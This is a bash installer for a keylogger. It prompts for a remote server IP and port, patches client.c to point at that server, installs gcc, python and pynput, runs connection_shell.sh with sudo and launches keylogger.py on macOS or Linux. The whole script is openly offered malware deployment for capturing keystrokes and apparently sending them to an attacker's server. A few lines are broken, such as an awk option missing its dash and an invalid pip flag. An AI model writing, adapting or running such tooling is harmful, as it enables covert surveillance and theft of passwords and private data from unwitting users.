#! /bin/bash

read -p 'Enter the IP address of your Server: ' server_ip
read -p 'Enter the Port Number of your Server: ' port_ip


if [[ "$OSTYPE" == "darwin"* ]]; then
    echo "Mac OS X"
    /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" -y
    brew install gcc
    brew install python
    pip install pynput
    script_dir=$(realpath $(dirname $0))
    script_dir=$script_dir/abcd.txt
    awk -v server_ip="$server_ip" -v port_ip="$port_ip" v script_dir="$script_dir" '{gsub(/127.0.0.1/, server_ip); gsub(/8080/, port_ip); gsub(/abcd.txt/, script_dir); print;}' client.c > new_client.c
    sudo /bin/bash connection_shell.sh
    echo "[+] Keylogger Started"
    python3 -u keylogger.py
        
else
    echo "Linux/Unix System"
    sudo apt install gcc -y
    sudo apt install python3 python3-pip -y
    pip install pynput -y
    result=$(pwd)
    script_dir=$(realpath $(dirname $0))
    script_dir=$script_dir/abcd.txt
    awk -v script_dir="$script_dir" '{gsub(/abcd.txt/, script_dir); print;}' client.c > new_client.c
    sudo /bin/bash connection_shell.sh
    echo "[+] Keylogger Started"
    python3 -u keylogger.py
fi






